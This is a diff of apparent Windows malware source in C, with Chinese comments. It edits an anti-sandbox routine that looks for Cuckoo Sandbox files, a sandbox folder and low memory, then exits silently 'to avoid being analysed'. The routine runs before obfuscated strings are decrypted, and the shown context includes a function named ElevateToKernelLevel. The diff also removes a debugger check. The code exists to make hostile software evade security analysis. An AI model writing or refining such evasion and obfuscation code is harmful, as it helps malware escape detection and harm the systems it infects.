@@ -101,16 +101,11 @@ static void DeobfW(WCHAR *s) {
 
 /** @brief 反沙箱检测 — 检查是否在虚拟化/分析环境中运行 */
 static BOOL IsSandboxed(void) {
-    /* 检查典型沙箱特征文件 */
     if (GetFileAttributesW(L"C:\\agent\\agent.pyw") != INVALID_FILE_ATTRIBUTES)
-        return TRUE;  /* Cuckoo Sandbox */
+        return TRUE;
     if (GetFileAttributesW(L"C:\\sandbox") != INVALID_FILE_ATTRIBUTES)
-        return TRUE;  /* 通用沙箱标志 */
-    /* 调试器检测 */
-    BOOL debugged = FALSE;
-    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);
-    if (debugged) return TRUE;
-    /* 物理内存 < 512MB → 极大概率是沙箱/虚拟机 */
+        return TRUE;
+    /* 物理内存 < 512MB → 沙箱 */
     MEMORYSTATUSEX ms = { sizeof(ms) };
     if (GlobalMemoryStatusEx(&ms) && ms.ullTotalPhys < 512ULL * 1024 * 1024)
         return TRUE;
@@ -1866,10 +1861,13 @@ static int ElevateToKernelLevel(void) {
 }
 
 int main(int argc, char *argv[]) {
-    /* ★ 反沙箱检测 — 在沙箱环境中直接退出，避免被分析 ★ */
-    if (IsSandboxed()) return 0;
+    /* ★ 反沙箱检测 ★ */
+    if (IsSandboxed()) {
+        /* 静默退出，不暴露任何信息 */
+        return 0;
+    }
 
-    /* ★ 解密所有混淆字符串 — 必须在任何功能使用前执行 ★ */
+    /* ★ 解密所有混淆字符串 */
     DecryptAllStrings();
 
     // ===== 第一步：解析命令行参数（最高优先级） =====
